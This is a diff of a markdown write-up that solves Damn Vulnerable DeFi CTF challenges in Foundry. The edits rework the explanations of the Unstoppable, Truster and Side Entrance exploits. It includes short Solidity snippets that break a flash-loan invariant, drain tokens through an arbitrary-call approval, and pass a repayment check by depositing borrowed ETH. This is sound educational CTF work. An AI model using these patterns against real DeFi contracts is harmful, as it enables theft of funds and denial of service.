@@ -5,23 +5,16 @@ Hi, my name is Juan,  i wrote this writeup to help anybody interested in develop
 Any comments/corrections please reach me at my twitter account: **@devnet0x**
 
 ## Challenge 1: Unstoppable ##
-We as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore in this line from function flashloan():
-        
-        if (poolBalance != balanceBefore) revert AssertionViolated();
-        
-        
+The vulnerability in this challenge is in the flashloan, previous to transfer tokens we have this condition:
 
-Then, nobody else will be able to borrow a flashloan:
+        if (poolBalance != balanceBefore) revert AssertionViolated();
+
+So, we as attacker's must transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore. Then, nobody else will be able to borrow a flashloan:
 
 ```
    function testExploit() public {
         /** EXPLOIT START **/
         vm.startPrank(attacker);
-        // We (attacker) transfer 1 token to lender pool to create a difference
-        // between poolBalance and balanceBefore in this line from function flashloan():
-        //
-        // if (poolBalance != balanceBefore) revert AssertionViolated();
-        //
         dvt.transfer(address(unstoppableLender), 1 ether);
         vm.stopPrank();
         /** EXPLOIT END **/
@@ -75,8 +68,7 @@ Source Code:
 https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver
 
 ## Challenge 3: Truster ##
-
-The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.
+The vulnerability in this challenge is that the flashloan let us execute any function in his own contract so we can approve tokens to our own attacker's addredd. The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.
 
 ```
         vm.startPrank(attacker);
@@ -117,9 +109,7 @@ The contract vulnerability is that you can cheat lender balance, depositing his 
         payable(_to).transfer(1000 ether);
     }
 ```
-Then, flashLoan function will call execute () function in our attacker's contract which will let us deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH). This way you can pass and pay the flashloan:
-        
-        `if (address(this).balance < balanceBefore)`
+Then, flashLoan function will call execute () function in our attacker's contract which will let us deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH). 
    
 ```
     function execute() external payable {
@@ -127,6 +117,10 @@ Then, flashLoan function will call execute () function in our attacker's contrac
     }
 ``` 
 
+This way you can pass and pay the flashloan:
+        
+        if (address(this).balance < balanceBefore)
+        
 Finally, in Foundry we just deploy our attacker contract:
 
 ``` 
